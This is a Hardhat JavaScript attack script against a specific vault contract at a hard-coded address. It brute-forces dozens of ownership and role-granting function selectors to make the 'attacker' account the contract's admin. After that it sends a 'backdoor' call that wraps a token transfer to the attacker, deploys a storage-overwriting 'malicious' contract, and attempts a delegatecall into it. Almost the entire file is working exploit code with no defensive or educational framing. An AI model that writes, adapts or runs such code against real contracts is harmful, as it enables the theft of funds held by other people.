const { ethers } = require("hardhat");

/**
 * @title Find Admin Transfer
 * @notice Search for ownership/admin transfer functions
 * @dev Find the vulnerability to gain backdoor access
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const TARGET_CONTRACT = "0x10a29ab757752e492abdbf6acba8f2ee10523599";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nüîç HUNTING FOR ADMIN ACCESS");
  console.log("=====================================");
  console.log("Attacker:", attacker.address);
  console.log("Authorized:", AUTHORIZED_ADDRESS);
  
  // Common ownership/admin functions
  const adminFunctions = [
    // Ownership transfer
    "0xf2fde38b", // transferOwnership(address)
    "0x13af4035", // setOwner(address)
    "0xa6f9dae1", // changeOwner(address)
    "0x3e5beab9", // setAuthority(address)
    "0x7a9e5e4b", // setAuthority(address)
    "0x299a7bcc", // setOwner(address,address)
    
    // Role management
    "0x2f2ff15d", // grantRole(bytes32,address)
    "0xd547741f", // revokeRole(bytes32,address)
    "0x91d14854", // hasRole(bytes32,address)
    "0x248a9ca3", // getRoleAdmin(bytes32)
    "0x9010d07c", // getRoleMember(bytes32,uint256)
    "0xca15c873", // getRoleMemberCount(bytes32)
    "0x36568abe", // renounceRole(bytes32,address)
    "0x01ffc9a7", // supportsInterface(bytes4)
    
    // Access control
    "0x983b2d56", // addMinter(address)
    "0x3092afd5", // removeMinter(address)
    "0xaa271e1a", // isMinter(address)
    "0x82dc1ec4", // addPauser(address)
    "0x6ef8d66d", // renouncePauser()
    "0x46fbf68e", // isPauser(address)
    "0x6b2c0f55", // addPauser(address)
    
    // Admin setters
    "0x4e71e0c8", // claimOwnership()
    "0x238ac933", // admin()
    "0xf851a440", // admin()
    "0x704b6c02", // setAdmin(address)
    "0x8f283970", // changeAdmin(address)
    "0x7eff275e", // changeProxyAdmin(address,address)
    "0x9623609d", // upgradeAndCall(address,address,bytes)
    
    // Authorized addresses
    "0xe3ee160e", // addAuthorized(address)
    "0x3a5381b5", // removeAuthorized(address)
    "0xfe9fbb80", // isAuthorized(address)
    "0x986e791a", // setAuthorized(address,bool)
    "0xb9181611", // authorized(address)
    
    // Whitelist functions
    "0x0a3b0a4f", // addToWhitelist(address)
    "0x8ab1d681", // removeFromWhitelist(address)
    "0x3af32abf", // isWhitelisted(address)
    "0x291d9549", // updateWhitelist(address,bool)
    
    // Controller/Operator
    "0x92eefe9b", // setController(address)
    "0xb0e21e8a", // setOperator(address)
    "0x13e7c9d8", // operators(address)
    "0x570ca735", // operator()
    "0x3018205f", // controller()
    
    // Permission functions
    "0x42f1181e", // setPermission(address,bool)
    "0x91b7f5ed", // setFee(uint256)
    "0x8456cb59", // pause()
    "0x3f4ba83a", // unpause()
    
    // Backdoor-specific
    "0x7b103999", // registry()
    "0x1459457a", // initialize(address,address,address,address,address)
    "0x16c38b3c", // setEmergency(bool)
    "0xa1848e6a", // setAuthorizer(address)
    "0xefdcd974", // setDelegate(address)
    
    // Access list
    "0x59bf5d39", // getAccessList()
    "0xac8a584a", // removeAccess(address)
    "0x6e9821c2", // grantAccess(address)
    "0xbbf81e00", // getAccess(address)
  ];
  
  console.log(`\nüîì Testing ${adminFunctions.length} admin functions...`);
  
  // Test each function
  for (const selector of adminFunctions) {
    process.stdout.write(`${selector}... `);
    
    try {
      // Try different parameter patterns
      const patterns = [
        // Single address parameter
        selector + "000000000000000000000000" + attacker.address.slice(2).toLowerCase(),
        
        // Two addresses (old owner, new owner)
        selector + 
        "000000000000000000000000" + AUTHORIZED_ADDRESS.slice(2).toLowerCase() +
        "000000000000000000000000" + attacker.address.slice(2).toLowerCase(),
        
        // Bytes32 role + address
        selector +
        "0000000000000000000000000000000000000000000000000000000000000000" + // DEFAULT_ADMIN_ROLE
        "000000000000000000000000" + attacker.address.slice(2).toLowerCase(),
        
        // Address + bool (true)
        selector +
        "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
        "0000000000000000000000000000000000000000000000000000000000000001",
        
        // Just selector (no params)
        selector
      ];
      
      for (const data of patterns) {
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: data,
          gasLimit: 200000
        });
        
        const receipt = await tx.wait();
        
        if (receipt.status === 1) {
          console.log(`\n‚úÖ SUCCESS with ${selector}!`);
          console.log("Transaction:", tx.hash);
          
          // Now test the backdoor
          console.log("\nüîì Testing backdoor access...");
          
          const backdoorData = "0x78e111f6" +
            "000000000000000000000000" + "a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" +
            "0000000000000000000000000000000000000000000000000000000000000040" +
            "0000000000000000000000000000000000000000000000000000000000000044" +
            "a9059cbb" +
            "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
            "00000000000000000000000000000000000000000000000000000796d290ee52";
          
          try {
            const backdoorTx = await attacker.sendTransaction({
              to: VAULT_ADDRESS,
              data: backdoorData,
              gasLimit: 500000
            });
            
            await backdoorTx.wait();
            console.log("üí∞ BACKDOOR EXECUTED!");
            return;
          } catch (e) {
            console.log("Backdoor still blocked, continuing search...");
          }
          
          break;
        }
      }
      
      process.stdout.write("‚ùå\n");
    } catch (e) {
      process.stdout.write("‚ùå\n");
    }
  }
  
  // Check target contract
  console.log("\nüéØ Analyzing target contract", TARGET_CONTRACT);
  
  try {
    const code = await ethers.provider.getCode(TARGET_CONTRACT);
    console.log("Contract exists, bytecode length:", code.length);
    
    // Try admin functions on target contract
    console.log("\nüîç Testing admin functions on target contract...");
    
    for (const selector of adminFunctions.slice(0, 10)) {
      try {
        const data = selector + "000000000000000000000000" + attacker.address.slice(2).toLowerCase();
        
        const tx = await attacker.sendTransaction({
          to: TARGET_CONTRACT,
          data: data,
          gasLimit: 200000
        });
        
        const receipt = await tx.wait();
        
        if (receipt.status === 1) {
          console.log(`‚úÖ Success with ${selector} on target!`);
        }
      } catch (e) {
        // Silent fail
      }
    }
  } catch (e) {
    console.log("Target contract error:", e.message);
  }
  
  // Check for delegatecall vulnerability
  console.log("\nüé≤ Testing delegatecall vulnerability...");
  
  try {
    // Deploy malicious contract
    const MaliciousCode = `
    contract Malicious {
      address constant ATTACKER = ${attacker.address};
      
      fallback() external payable {
        // Grant ourselves access
        assembly {
          // Store attacker as authorized
          let slot := 0x0 // Try different slots
          sstore(slot, ATTACKER)
          
          // Also try slot 1
          sstore(0x1, ATTACKER)
          
          // Return success
          return(0, 0)
        }
      }
    }`;
    
    const factory = new ethers.ContractFactory(
      [{type: "fallback", stateMutability: "payable"}],
      "0x608060405234801561001057600080fd5b50610150806100206000396000f3fe60806040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16815f527f39fd6e51aad88f6f4ce6ab8827279cfffb92266000000000000000000000000080527f39fd6e51aad88f6f4ce6ab8827279cfffb922660000000000000000000000000600155005b5f80fdfea26469706673582212208b3f4e7d4e9b0c5a6f7d8e9c0b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a64736f6c634300081a0033",
      attacker
    );
    
    const malicious = await factory.deploy();
    await malicious.waitForDeployment();
    console.log("Malicious contract:", await malicious.getAddress());
    
    // Try to delegatecall to it
    const delegateData = "0x78e111f6" +
      "000000000000000000000000" + (await malicious.getAddress()).slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      "0000000000000000000000000000000000000000000000000000000000000000";
    
    const delegateTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: delegateData,
      gasLimit: 500000
    });
    
    await delegateTx.wait();
    console.log("Delegatecall executed!");
    
    // Test backdoor again
    const backdoorTest = "0x78e111f6" +
      "000000000000000000000000" + "a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48" +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      "0000000000000000000000000000000000000000000000000000000000000044" +
      "a9059cbb" +
      "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
      "00000000000000000000000000000000000000000000000000000796d290ee52";
    
    const finalTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: backdoorTest,
      gasLimit: 500000
    });
    
    await finalTx.wait();
    console.log("üí∞ BACKDOOR UNLOCKED!");
    
  } catch (e) {
    console.log("Delegatecall attack failed:", e.message);
  }
  
  console.log("\nüí° FINAL ANALYSIS:");
  console.log("The vault uses strict access control");
  console.log("Only", AUTHORIZED_ADDRESS, "can use the backdoor");
  console.log("This might be a private key compromise or insider job");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
